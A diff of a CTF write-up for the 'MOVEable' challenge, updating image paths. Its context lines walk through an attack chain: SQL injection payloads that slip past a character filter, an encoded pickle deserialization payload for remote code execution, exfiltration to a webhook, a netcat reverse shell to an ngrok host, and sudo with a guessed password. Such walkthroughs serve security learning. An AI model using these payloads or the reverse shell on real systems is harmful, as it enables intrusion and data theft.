@@ -20,7 +20,7 @@ In this write-up, I will describe all the steps and the way that I think to solv
 
 Looks like the page just has a simple login page at first. When I tried to use some common credentials like `admin:admin` `admin:password`, none of them worked.
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image.png>)
 
 Dig into the source provided, we have the directory tree as below:
 
@@ -40,7 +40,7 @@ Let’s dig into source code `app.py`, where the dev controls everything. We hav
 
 When the query successfully executed and there is result returned into `user` variable, it will continue to execute next query.
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%201.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%201.png>)
 
 Have a quick look on `DBClean` function, we can see that the developer considers these 3 characters: space  ``, single quote `'` and double quote `"` as `bad_char` and replace them with `blank`.
 
@@ -48,17 +48,17 @@ After that, the function will return the string and also replace `\` with single
 
 Which indicates that we can make use of this `\` character to perform `SQL Injection` and we will use `tab` instead of `space` to avoid being sanitized.
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%202.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%202.png>)
 
 After this finding, I tried several SQL Injection payload like `\	OR	1=1	--	-` , `\	UNION	SELECT	1,2	--	-` but none of them worked. The result was just only Username or password is incorrect.
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%203.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%203.png>)
 
 Reading more on the function `executescript`, I know that it is able to handle multiple queries by separated with `;`. So I tried to use another query to insert fake credential `\;	INSERT	INTO	users	(username,password)	VALUES	(\hack\,\hack\);	--`	 
 
 —> **FAILED**
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%204.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%204.png>)
 
 So at that time, I thought that I will need to understand more on how the app process, so I tried to setup a Docker lab using the given `requirements.txt` file to explore the app’s behaviour.
 
@@ -70,13 +70,13 @@ By running the app in local, I was able to modify the `flash("Username or passwo
 
 For other steps, I use `print('message',file=sys.stderr)` to print out in my local terminal for debugging.
 
-![*Note: This is in my local environment*](<images/2024-11-02-MOVEable Write Up/image%205.png>)
+![*Note: This is in my local environment*](<../assets/images/2024-11-02-MOVEable Write Up/image%205.png>)
 
 *Note: This is in my local environment*
 
 After seeing that nothing wrong with my query, I did a quick check on my Docker terminal with `sqlite3` —> Turned out that the query was executed successfully and the user was added in db.
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%206.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%206.png>)
 
 By doing more research, I found out the `executescript` actually **doesn’t return anything**, because it executes multiple queries, what should it return?
 
@@ -92,7 +92,7 @@ Another function caught my eyes was `download_file(filename, sessionid)` in the 
 
 The way it uses `GET` method with parameters `filename` and `sessionid` without any sanitization made me think that we can input anything in there.
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%207.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%207.png>)
 
 Looking through the code, we can see it has the flow like below:
 
@@ -112,7 +112,7 @@ Checking in line 107: `session_id = str(uuid.uuid4())`
 
 Looks like it use `uuid.uuid4()` to generate a session ID and also insert current `datetime` with format `%Y-%m-%d %H:%M:%S.%f'`
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%208.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%208.png>)
 
 By applying these functions, I got the value for `session_id` and `timestamp`:
 
@@ -131,7 +131,7 @@ At this point, I got 2 payloads:
 
 By adding them to login form in my local site, I see the payloads were executed successfully
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%209.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%209.png>)
 
 Following the format of the route `/download/<filename>/<sessionid>`, I have the URL:
 
@@ -141,7 +141,7 @@ Following the format of the route `/download/<filename>/<sessionid>`, I have the
 
 **—> Which means we successfully reached to** `pickle.loads` **function!!!**
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%2010.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2010.png>)
 
 **But now what?** I tried which many data content and file names, even some `../../../` for path traversal, but still got only 1 same error.
 
@@ -151,7 +151,7 @@ From Copilot, I learned that `pickle.loads` mechanism is to **deserialize** data
 
 Inside `pickle.loads`, there is magic method `__reduce__` will be called whenever deserialization happens.
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%2011.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2011.png>)
 
 Copilot also provided me the Python script to generate payload to trick the `__reduce__` method to run OS Command.
 
@@ -178,7 +178,7 @@ Then I put it as a content of a file: `\;	INSERT	INTO	files	VALUES	(\file2\,\gAS
 
 As I enter the URL with `file2` that I provided, in my terminal, I see the command return `root`. Which indicates that the OS Command was triggered.
 
-![Screenshot 2024-10-30 at 16.40.52.png](<images/2024-11-02-MOVEable Write Up/Screenshot_2024-10-30_at_16.40.52.png>)
+![Screenshot 2024-10-30 at 16.40.52.png](<../assets/images/2024-11-02-MOVEable Write Up/Screenshot_2024-10-30_at_16.40.52.png>)
 
 **BUT** the thing is, we don’t have terminal to read on that server….
 
@@ -190,7 +190,7 @@ Payload: `gASViQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjG5scyAvID4gL3BheWxvYWQudHh0Oy
 
 Insert another file then run URL like above, I got the result returned in my webhook site
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%2012.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2012.png>)
 
 **BUT** (yes… another *but*) when I tried this payload on the real challenge, it didn’t return anything to my webhook, for both `curl` and `wget`.
 
@@ -200,7 +200,7 @@ So I decided to try one more time with reverse shell. This time I use `ngrok` to
 
 Command: `ngrok tcp 1343`
 
-![Executed from my laptop terminal](<images/2024-11-02-MOVEable Write Up/image%2013.png>)
+![Executed from my laptop terminal](<../assets/images/2024-11-02-MOVEable Write Up/image%2013.png>)
 
 Executed from my laptop terminal
 
@@ -210,13 +210,13 @@ For payload, I use OS command `nc 0.tcp.ap.ngrok.io 14308 -e sh` to run `sh` to 
 
 When the command was executed on server, in my terminal (where I was listening to the incoming request), there will be message informing me that there is connectiong coming
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%2014.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2014.png>)
 
 All I need to do now is just typing the command I want.
 
 So basically, I’m remoting to the server.
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%2015.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2015.png>)
 
 As I saw that it worked, I tried on the real challenge website. And once again… it failed :(
 
@@ -236,7 +236,7 @@ What we are missing is the place to show the OS Command output.
 
 As noticing the source code one more time, I saw that if the `send_file` function fails, it will send a `flash` message then the message will be output to HTML page.
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%2016.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2016.png>)
 
 **WHAT IF** we make use of the payload that tricks `pickle` to run OS Command to also manipulate the `flash` message, so it can output the OS Command result?
 
@@ -264,7 +264,7 @@ print("Fake flash: " + str(encoded_payload))
 
 As I tried the command `ls /` —> **It worked!!!!!**
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%2017.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2017.png>)
 
 Now the only thing left is to find where the flag is!
 
@@ -272,7 +272,7 @@ I tried to look around in current directory —> nothing special.
 
 Suspecting that the file is hidden in `root` directory, but when I ran the payload with OS command `ls /root`. There was **Internal Server Error**
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%2018.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2018.png>)
 
 There was something wrong but my payload hasn’t been changed anything except the command. So I suspected there is privilege issue.
 
@@ -280,11 +280,11 @@ So I ran `whoami` to see what is the current account.
 
 Ok, current account is `moveable`. Maybe it doesn’t have `root` privilege
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%2019.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2019.png>)
 
 I tried to use `ls / -l` to list all files in `/` directory and found out there is `root` directory has configuration that only `root` can access `rwx` (read-write-execute), while others are `------` (no access at all)
 
-![*Note: lsxxx is just my filename*](<images/2024-11-02-MOVEable Write Up/image%2020.png>)
+![*Note: lsxxx is just my filename*](<../assets/images/2024-11-02-MOVEable Write Up/image%2020.png>)
 
 *Note: lsxxx is just my filename*
 
@@ -298,18 +298,18 @@ I didn’t know the root password so I just tried the common one “root”
 
 And surprisingly… it worked!
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%2021.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2021.png>)
 
 so when I tried `echo "root" | sudo -S ls /root` 
 
 Yep… It’s there!!!
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%2022.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2022.png>)
 
 What I needed to do left was `echo "root" | sudo -S cat /root/flag.txt`
 
 **BINGO!!!**
 
-![image.png](<images/2024-11-02-MOVEable Write Up/image%2023.png>)
+![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2023.png>)
 
 This took me around 5 days to solve, it’s a special memory for a guy just have learned pentesting for more than 2 months like me. Hope you guys enjoy!
